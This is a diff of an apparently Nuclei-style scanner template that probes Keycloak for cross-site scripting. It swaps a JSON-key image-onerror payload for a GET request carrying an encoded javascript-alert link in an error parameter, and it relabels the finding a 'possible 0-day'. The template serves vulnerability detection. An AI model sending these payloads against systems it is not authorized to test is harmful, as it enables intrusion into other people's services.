@@ -1,35 +1,24 @@
-id: keycloak-xss
+id: Keycloak-XSS
 
 info:
-  name: Keycloak <= 8.0 - Cross-Site Scripting
-  author: incogbyte
-  severity: info
-  description: Keycloak 8.0 and prior contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.
-  reference:
-    - https://cure53.de/pentest-report_keycloak.pdf
-  classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
-    cvss-score: 7.2
-    cwe-id: CWE-79
-  tags: keycloak,xss
+  name: Keycloak xss 
+  author: Excis3
+  severity: Medium
+  description: XSS Keycloak, possible 0-day
+  tags: XSS
 
 requests:
-  - raw:
-      - |
-        POST /auth/realms/master/clients-registrations/openid-connect HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/json
-
-        {"<img onerror=confirm(1337) src/>":1}
+  - method: GET
+    path:
+      - "{{BaseURL}}/auth/realms/master/protocol/openid-connect/oauth/oob?error=%3Ca%20href=%22javascript%26%00colon;alert(document.domain)%22%3EReturn%20to%20application%3C/a%3E"
 
     matchers-condition: and
     matchers:
+      - type: word
+        part: body
+        words:
+          - "javascript&colon;alert%28document.domain%29"
+          
       - type: status
         status:
-          - 400
-
-      - type: word
-        words:
-          - 'Unrecognized field "<img onerror=confirm(1337) src/>"'
-
-# Enhanced by mp on 2022/09/23
+          - 200
